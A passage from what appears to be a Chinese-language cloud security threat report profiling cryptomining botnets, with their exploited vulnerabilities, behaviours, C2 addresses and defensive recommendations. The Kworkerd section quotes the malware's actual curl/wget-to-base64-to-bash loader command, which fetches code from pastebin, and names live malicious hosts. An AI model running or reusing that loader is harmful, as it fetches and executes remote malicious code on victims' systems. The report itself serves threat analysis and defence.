MyKings 组成较为复杂，它由攻击模块、下载脚本、包括 mirai 在内的多个恶意木马组成，其中攻击模块集成了 masscan，能够“高效”
地扫描、攻击其他主机。
![
](https://images.seebug.org/content/images/2019/01/85bbb7be-8197-438e-be01-b5d6b96b4337.png-w331s)
#### 4\. Bulehero 挖矿团伙
1)主要利用漏洞：
2018 年中 Bulehero 出现时，传播主要依赖“永恒之蓝”漏洞、Struts2 和 Weblogic 漏洞、对内网主机进行 1433
端口爆破(SQL Server)和 IPC 远程连接爆破攻击等几种挖矿僵尸网络的常见传播手段；到了年底，该挖矿团伙开始利用 ThinkPHP
远程命令执行漏洞，入侵新的一批机器。
2)主要恶意行为：
  * 下载、释放、运行多个包含扫描、挖矿等功能的恶意程序
3)主要命令控制和更新方式
  * 从 a46.bulehero.in 服务器获取下载器，运行后进一步下载、释放多个包含扫描、挖矿等功能的恶意程序。
4)挖矿网络结构：
![
](https://images.seebug.org/content/images/2019/01/a5fbcdba-d0cb-493e-ad9a-fa216ef96a20.png-w331s)
#### 5\. RDPMiner 挖矿团伙
该挖矿僵尸网络自 2018 年 10 月开始蔓延，之后多次更换挖矿程序名称。
1)主要利用漏洞：
  * RDP 弱口令
2)主要恶意行为：
  * 下载、释放、运行多个包含扫描、挖矿等功能的恶意程序
  * 关闭 Windows 防火墙，添加自启动项
  * 添加恶意用户账号
3)主要命令控制和更新方式
  * 以 111.63.225.242 作为文件分发服务器。
4)挖矿网络结构：
![
](https://images.seebug.org/content/images/2019/01/688315e6-83c2-4d32-832d-c21a4d43f5e1.png-w331s)
#### 6\. JbossMiner 挖矿团伙
阿里云安全团队于 2018 年 3 月报道过，从蜜罐中捕获到JbossMiner 的恶意程序样本，该样本由 py2exe 打包，解包反编译后是一套由
Python 编写的完整攻击程序，包含源码及依赖类库等数十个文件。且对于 Windows 和 Linux 系统的受害主机，有不同的利用程序。
1)主要利用漏洞：
  * Jboss 反序列化漏洞（主要） 
  * Struts2 远程命令执行漏洞
  * “永恒之蓝”漏洞
2)主要恶意行为：
  * 下载、释放、运行多个包含扫描、挖矿等功能的恶意程序
3)主要命令控制和更新方式：
  * 以 enjoytopic.esy.es 等网站作为分发平台
4)挖矿网络结构：
![
](https://images.seebug.org/content/images/2019/01/10e40633-d2a3-4f95-993c-d0f8a6a0aad6.png-w331s)
#### 7\. WannaMine
WannaMine 是一个蠕虫型僵尸网络。这个挖矿团伙的策略曾被CrowdStrike 形容为“靠山吃山靠水吃水”(living off the
land)，因为恶意程序在被感染的主机上，首先会尝试通过 Mimikatz 收集的密码登录其他主机，失败之后再利用“永恒之蓝”漏洞攻击其他主机，进行
繁殖传播。
1)主要利用漏洞：
  * “永恒之蓝”漏洞
  * RDP 弱密码或多台机使用同样密码
2)主要恶意行为：
  * 下载、释放、运行多个包含扫描、挖矿等功能的恶意程序
  * 从内存中 dump 用户密码
3)主要命令控制和更新方式：
  * 以 http://118.184.48.95:8000 作为文件分发平台
4)挖矿网络结构：
![
](https://images.seebug.org/content/images/2019/01/6bc55069-1dda-4691-a353-6296eed63d57.png-w331s)
## 8\. Kworkerd
这是一个主要攻击 Redis 数据库未授权访问漏洞的挖矿僵尸网络， 因其将挖矿程序的名字伪装成 Linux 正常进程 Kworkerd 故得名。
1)主要利用漏洞：
  * Redis 服务未授权访问
2)主要恶意行为：
  * 下载、释放、运行多个包含扫描、挖矿等功能的恶意程序
  * 替换/etc/ld.so.preload 文件，通过预加载劫持 Linux 系统函数，使 top、ps 等命令无法找到挖矿进程。
3)主要命令控制和更新方式
  * 该挖矿团伙使用 pastebin 作为文件分发平台
4)挖矿网络结构：
已被感染的恶意主机会首先下载 https://pastebin.com/raw/xbY7p5Tb 文件，其内容为
    (curl -fsSL https://pastebin.com/raw/uuYVPLXd||wget -q -Ohttps://pastebin.com/raw/uuYVPLXd)|base64
    -d|/bin/bash
执行后会再次请求 https://pastebin.com/raw/uuYVPLXd
，该脚本解码后内容类似前文所述其他挖矿团伙，会清除同类挖矿程序、下载并执行自己的挖矿程序、扫描内网主机进一步扩大入侵范围等。
该木马只利用一种漏洞却仍有不少感染量，说明数据库安全配置亟待得到用户的重视。
#### 9\. DockerKiller
随着微服务的热度不断上升，越来越多的企业选择容器来部署自己的应用。而 Docker
作为实现微服务首选容器，在大规模部署的同时其安全性却没有引起足够的重视。2018 年 8 月， Docker
配置不当导致的未授权访问漏洞遭到挖矿团伙的批量利用。
1)主要利用漏洞：
  * Docker 未授权访问
2)主要恶意行为：
  * 下载、释放、运行多个包含扫描、挖矿等功能的恶意程序
  * 关闭 Windows 防火墙
  * 添加自启动项
  * 添加恶意用户账号
3)主要命令控制和更新方式：
从 [http://159.203.21.239 ](http://159.203.21.239/)下载名为 auto.sh
的脚本，该脚本作为下载器，会下载后续入侵、挖矿需要的各种程序；完整服务器文件列表如下：
![
](https://images.seebug.org/content/images/2019/01/e5f2b6b1-8791-4584-a218-9d8386557599.png-w331s)
4)挖矿网络结构：
### 安全建议
如今尽管币价低迷，但由于经济形势承受下行的压力，可能为潜在的犯罪活动提供诱因。阿里云预计， 2019
年挖矿活动数量仍将处于较高的水位；且随着挖矿和漏洞利用相关知识的普及，恶意挖矿的入场玩家可能趋于稳定且伴有少量增加。
基于这种状况，阿里云安全团队为企业和个人提供如下安全建议：
  * 安全系统中最薄弱的一环在于人， 最大的安全问题也往往出于人的惰性，因此弱密码、爆破的问题占了挖矿原因的半壁江山。无论是企业还是个人，安全意识教育必不可少；
  * 0-Day 漏洞修复的窗口期越来越短，企业需要提升漏洞应急响应的效率， 一方面是积极进行应用系统更新， 另一方面是关注产品的安全公告并及时升级，同时也可以选择购买安全托管服务提升自己的安全水位；
  * 伴随着云上弹性的计算资源带来的便利，一些非 Web 类的网络应用暴露的风险也同步上升，安全运维人员应该重点关注非 Web 类的应用伴随的安全风险，或者选择购买带 IPS 功能的防火墙产品， 第一时间给 0-Day 漏洞提供防护。
### 参考文献
  1. MyKing 黑产团伙最新挖矿活动曝光  
  2. 彻底曝光黑客“ 隐匿者” 目前作恶最多的网络攻击团伙  
  3. DDG 挖矿僵尸网络瞄准数据库服务器：收益已达近 800 万  
  4. 蠕虫病毒 bulehero 再次利用“ 永恒之蓝”在企业内网攻击传播  
  5. JbossMiner 挖矿蠕虫分析  
  6. Kworkerd 恶意挖矿分析 https://[www.anquanke.com/post/id/159497](http://www.anquanke.com/post/id/159497)
  7. Threat Hunting, the Investigation of Fileless Malware Attacks  
  8. Cryptomining: Harmless Nuisance or Disruptive Threat?  
  9. 疑似国内来源的“ 8220”追踪溯源分析  
  10. 
* * *